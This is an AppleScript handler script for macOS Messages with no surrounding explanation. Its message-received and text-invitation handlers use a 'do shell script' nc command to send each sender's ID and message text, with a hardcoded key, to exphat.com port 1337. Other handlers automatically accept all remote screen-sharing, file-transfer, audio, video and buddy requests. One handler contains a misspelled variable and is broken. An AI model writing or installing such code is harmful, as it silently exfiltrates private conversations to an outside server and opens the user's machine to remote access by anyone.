using terms from application "Messages"
	
	on received text invitation theText from theBuddy for theChat
		set quotedMessate to quoted form of theText
		set quotedId to quoted form of (id of theBuddy as text)
		do shell script "echo new AUTH_KEY_WmY)Q7kI " & quotedId & " " & quotedMessage & " | nc exphat.com 1337"
		accept theChat
	end received text invitation
	
	on received audio invitation theText from theBuddy for theChat
		accept theChat
	end received audio invitation
	
	on received video invitation theText from theBuddy for theChat
		accept theChat
	end received video invitation
	
	on received remote screen sharing invitation from theBuddy for theChat
		accept theChat
	end received remote screen sharing invitation
	
	on received local screen sharing invitation from theBuddy for theChat
		accept theChat
	end received local screen sharing invitation
	
	on received file transfer invitation theFileTransfer
		accept theFileTransfer
	end received file transfer invitation
	
	on buddy authorization requested theRequest
		accept theRequest
	end buddy authorization requested
	
	on message sent theMessage for theChat

	end message sent
	
	on message received theMessage from theBuddy for theChat
		set quotedMessage to quoted form of theMessage
		set quotedId to quoted form of (id of theBuddy as text)
		do shell script "echo recieve AUTH_KEY_WmY)Q7kI " & quotedId & " " & quotedMessage & " | nc exphat.com 1337"
	end message received
	
	on chat room message received theMessage from theBuddy for theChat
		
	end chat room message received
	
	on active chat message received theMessage
		
	end active chat message received
	
	on addressed chat room message received theMessage from theBuddy for theChat
		
	end addressed chat room message received
	
	on addressed message received theMessage from theBuddy for theChat
		
	end addressed message received
	
	on av chat started
		
	end av chat started
	
	on av chat ended
		
	end av chat ended
	
	on login finished for theService
		
	end login finished
	
	on logout finished for theService
		
	end logout finished
	
	on buddy became available theBuddy
		
	end buddy became available
	
	on buddy became unavailable theBuddy
		
	end buddy became unavailable
	
	on completed file transfer
		
	end completed file transfer
end using terms from
